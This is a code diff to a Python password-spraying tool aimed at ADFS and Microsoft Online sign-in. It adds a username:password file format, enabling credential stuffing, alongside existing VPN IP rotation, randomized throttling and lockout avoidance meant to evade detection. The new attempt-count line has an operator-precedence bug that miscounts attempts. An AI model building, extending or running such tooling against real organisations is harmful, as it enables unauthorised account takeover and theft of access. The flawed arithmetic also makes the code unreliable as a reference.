@@ -32,6 +32,7 @@ def args_parse():
     pass_group.add_argument('-p', '--password', help="Single password to test")
     pass_group.add_argument('-P', '--passwordlist', help="Password list to test, one password per line")
     pass_group.add_argument("--userAsPass", action=argparse.BooleanOptionalAction, help="Use username as password")
+    pass_group.add_argument("--userPass", action=argparse.BooleanOptionalAction, help="Use username:password as file entry format")
     sleep_group.add_argument('-s', '--sleep', type=int, help="Throttle the attempts to one attempt every # seconds, can be randomized by passing the value 'random' - default is 0", default=0)
     sleep_group.add_argument('-r', '--random', nargs=2, type=int, metavar=('minimum_sleep', 'maximum_sleep'), help="Randomize the time between each authentication attempt. Please provide minimum and maximum values in seconds")
     target_group.add_argument('-T', '--targetlist', help="Targets list to use, one target per line")
@@ -46,19 +47,22 @@ def args_parse():
     parser.add_argument('method', choices=['adfs', 'msol'])
     return parser.parse_args()
 
-def msol_attempts(usernames, passwords, targets, sleep_time, random, min_sleep, max_sleep, vpn, vpn_area, vpn_tries_per_ip, initial_ip, skip_tested, ignore_success, userAsPass, force):
+def msol_attempts(usernames, passwords, targets, sleep_time, random, min_sleep, max_sleep, vpn, vpn_area, vpn_tries_per_ip, initial_ip, skip_tested, ignore_success, userAsPass, userPass, force):
     working_creds_counter = 0  # zeroing the counter of working creds before starting to count
     skiped_username_counter = 0
     username_counter = 0
     prev_ip = initial_ip
     lockout_counter = 0
     lockout_question = False
-    total_attempts = len(usernames) * len(usernames if userAsPass else passwords) * len(targets)
+    total_attempts = len(usernames) * len(targets) * 1 if (userAsPass or userPass) else len(passwords)
 
     for target in targets:
         for username in usernames:
             if (userAsPass):
-                    passwords = [username.split('@')[0]]
+                passwords = [username.split('@')[0]]
+            elif (userPass):
+                passwords = [username.split(':')[-1]]
+                username = username.split(':')[0]
             for password in passwords:  # trying one password against each user, less likely to lockout users
                 if ignore_success:
                     try:
@@ -196,19 +200,22 @@ def msol_attempts(usernames, passwords, targets, sleep_time, random, min_sleep, 
     LOGGER.info("[*] Finished running at: %s" % datetime.datetime.now().strftime('%d-%m-%Y %H:%M:%S'))
 
 
-def adfs_attempts(usernames, passwords, targets, sleep_time, random, min_sleep, max_sleep, vpn, vpn_area, vpn_tries_per_ip, initial_ip, skip_tested, ignore_success, userAsPass):
+def adfs_attempts(usernames, passwords, targets, sleep_time, random, min_sleep, max_sleep, vpn, vpn_area, vpn_tries_per_ip, initial_ip, skip_tested, ignore_success, userAsPass, userPass):
     working_creds_counter = 0  # zeroing the counter of working creds before starting to count
     skiped_username_counter = 0
     username_counter = 0
     prev_ip = initial_ip
-    total_attempts = len(usernames) * len(usernames if userAsPass else passwords) * len(targets)
+    total_attempts = len(usernames) * len(targets) * 1 if (userAsPass or userPass) else len(passwords)
 
     try:
         LOGGER.info("[*] Started running at: %s" % datetime.datetime.now().strftime('%d-%m-%Y %H:%M:%S'))
         for target in targets:  # checking each target separately
             for username in usernames:
                 if (userAsPass):
-                        passwords = [username.split('@')[0]]
+                    passwords = [username.split('@')[0]]
+                elif (userPass):
+                    passwords = [username.split(':')[-1]]
+                    username = username.split(':')[0]
                 for password in passwords:  # trying one password against each user, less likely to lockout users
                     if ignore_success:
                         try:
@@ -341,7 +348,7 @@ def main():
         targets = ["https://login.microsoft.com"]
 
     total_accounts = len(usernames)
-    total_passwords = len(usernames if args.userAsPass else passwords)
+    total_passwords = len(usernames if (args.userAsPass or args.userPass) else passwords)
     total_targets = len(targets)
     total_attempts = total_accounts * total_passwords * total_targets
     LOGGER.info("Total number of users to test: %s" % str(total_accounts))
@@ -380,11 +387,11 @@ def main():
     if args.method == 'adfs':
         LOGGER.info("Now spraying ADFS.")
         adfs_attempts(usernames, passwords, targets,
-                      args.sleep, random, min_sleep, max_sleep, args.vpn, area, args.vpn_tries_per_ip, initial_ip, args.skip_tested, args.ignore_success, args.userAsPass)
+                      args.sleep, random, min_sleep, max_sleep, args.vpn, area, args.vpn_tries_per_ip, initial_ip, args.skip_tested, args.ignore_success, args.userAsPass, args.userPass)
     elif args.method =='msol':
         LOGGER.info("Now spraying Microsoft Online.")
         msol_attempts(usernames, passwords, targets, args.sleep, random, min_sleep, max_sleep, 
-                  args.vpn, area, args.vpn_tries_per_ip, initial_ip, args.skip_tested, args.ignore_success, args.userAsPass, args.force)
+                  args.vpn, area, args.vpn_tries_per_ip, initial_ip, args.skip_tested, args.ignore_success, args.userAsPass, args.userPass, args.force)
     else:
         LOGGER.critical("[!] Please choose a method (autodiscover or adfs)")
 
